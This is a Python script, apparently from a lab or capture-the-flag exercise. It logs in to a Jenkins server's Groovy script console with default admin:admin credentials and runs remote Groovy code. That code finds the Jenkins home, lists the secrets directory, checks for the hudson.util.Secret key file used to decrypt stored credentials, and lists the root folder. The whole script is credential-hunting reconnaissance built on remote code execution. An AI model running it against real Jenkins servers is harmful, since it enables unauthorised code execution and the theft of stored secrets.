import requests
from requests.auth import HTTPBasicAuth

url = "http://localhost:8080/scriptText"
auth = HTTPBasicAuth('admin', 'admin')

# Test 1: Get Jenkins home
script1 = "println(jenkins.model.Jenkins.instance.rootDir)"
resp1 = requests.post(url, data={'script': script1}, auth=auth, verify=False)
print(f"Jenkins Home: {resp1.text}")

# Test 2: List secrets directory
script2 = """
def secretsDir = new File(jenkins.model.Jenkins.instance.rootDir, 'secrets')
if (secretsDir.exists()) {
    println(secretsDir.listFiles()*.name)
} else {
    println('SECRETS_DIR_NOT_FOUND')
}
"""
resp2 = requests.post(url, data={'script': script2}, auth=auth, verify=False)
print(f"Secrets dir contents: {resp2.text}")

# Test 3: Check if hudson.util.Secret exists
script3 = """
def file = new File(jenkins.model.Jenkins.instance.rootDir, 'secrets/hudson.util.Secret')
println("Exists: " + file.exists())
println("Path: " + file.absolutePath)
"""
resp3 = requests.post(url, data={'script': script3}, auth=auth, verify=False)
print(f"hudson.util.Secret check: {resp3.text}")

# Test 4: List root directory
script4 = "println(jenkins.model.Jenkins.instance.rootDir.listFiles()*.name)"
resp4 = requests.post(url, data={'script': script4}, auth=auth, verify=False)
print(f"Jenkins root contents: {resp4.text}")
